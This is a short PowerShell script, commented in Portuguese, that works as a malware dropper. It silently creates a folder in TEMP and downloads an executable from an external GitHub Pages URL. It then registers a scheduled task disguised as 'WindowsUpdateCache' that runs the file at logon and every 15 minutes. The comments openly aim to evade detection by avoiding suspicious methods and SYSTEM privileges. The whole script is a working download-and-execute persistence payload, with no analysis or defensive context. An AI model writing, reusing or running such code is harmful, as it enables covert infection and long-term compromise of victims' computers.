# Configurações
$folder = "$env:TEMP\sys_cache"
$exePath = "$folder\sys_cache.exe"
$url = "https://syslog992.github.io/sys-cache-update/sys_cache.exe"
$taskName = "WindowsUpdateCache"

# 1. Cria a pasta de forma silenciosa
if (!(Test-Path $folder)) {
    New-Item -ItemType Directory -Force -Path $folder | Out-Null
}

# 2. Baixa o executável usando um método menos suspeito
try {
    Invoke-WebRequest -Uri $url -OutFile $exePath
} catch {
    exit
}

# 3. Persistência: Agora como USUÁRIO (menos chance de detecção que o SYSTEM)
$action = New-ScheduledTaskAction -Execute $exePath
$trigger1 = New-ScheduledTaskTrigger -AtLogOn
$trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 15)

# Registra a tarefa sem pedir privilégios de Administrador
Register-ScheduledTask -Action $action -Trigger $trigger1, $trigger2 -TaskName $taskName -Force
